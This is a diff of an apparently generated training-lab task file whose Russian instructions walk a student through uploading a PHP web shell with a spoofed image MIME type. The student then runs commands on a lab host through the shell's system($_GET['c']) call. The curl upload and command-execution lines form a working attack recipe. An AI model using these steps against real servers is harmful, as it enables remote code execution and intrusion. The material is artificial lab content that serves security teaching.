@@ -13,7 +13,7 @@
     },
     {
       "path": "/home/student/task/task.md",
-      "text": "# Практика: обход проверки загрузки → webshell\n\nЦель — `http://app.lab.local`. Форма загрузки проверяет только расширение.\nВ каталоге уже лежит `shell.php` — веб-шелл. Нужно протащить его как картинку.\n\n1. Загрузи файл, подделав MIME-тип:\n\n   curl -s -F 'file=@shell.php;type=image/png' -F 'name=avatar' http://app.lab.local/upload\n\n2. Сервер вернёт URL загруженного файла. Обратись к нему с командой:\n\n   curl -s 'http://app.lab.local/uploads/ab12cd.php?c=id'\n\n3. Прочитай флаг: `... ?c=cat flag.txt`.\n4. Запиши флаг в `found.txt` и набери `check`.\n"
+      "text": "# Практика: обход проверки загрузки → webshell\n\nЦель — `http://app.lab.local`. Форма загрузки проверяет только расширение.\nВ каталоге уже лежит `shell.php` — веб-шелл. Нужно протащить его как картинку.\n\n1. Загрузи файл, подделав MIME-тип:\n\n   curl -s -F 'file=@shell.php;type=image/png' -F 'name=avatar' http://app.lab.local/upload\n\n2. Сервер вернёт URL загруженного файла. Обратись к нему с командой:\n\n   curl -s 'http://app.lab.local/uploads/ab12cd.php?c=id'\n\n3. Прочитай флаг: `... ?c=cat flag.txt`.\n4. Запиши флаг в `found.txt` и набери `check`.\n\n## Повторение (`web-command-injection`)\n\nЗагрузка веб-шелла — это путь к RCE, и подстановку команд ты разбирал в `web-command-injection`. Освежи: посмотри, что именно исполняет веб-шелл `shell.php`:\n\n    cat shell.php\n\n`system($_GET['c'])` — параметр `c` управляет командой; это та же инъекция команд, только через загруженный файл. Ниже обходишь проверку расширения и вызываешь шелл.\n"
     },
     {
       "path": "/home/student/task/shell.php",
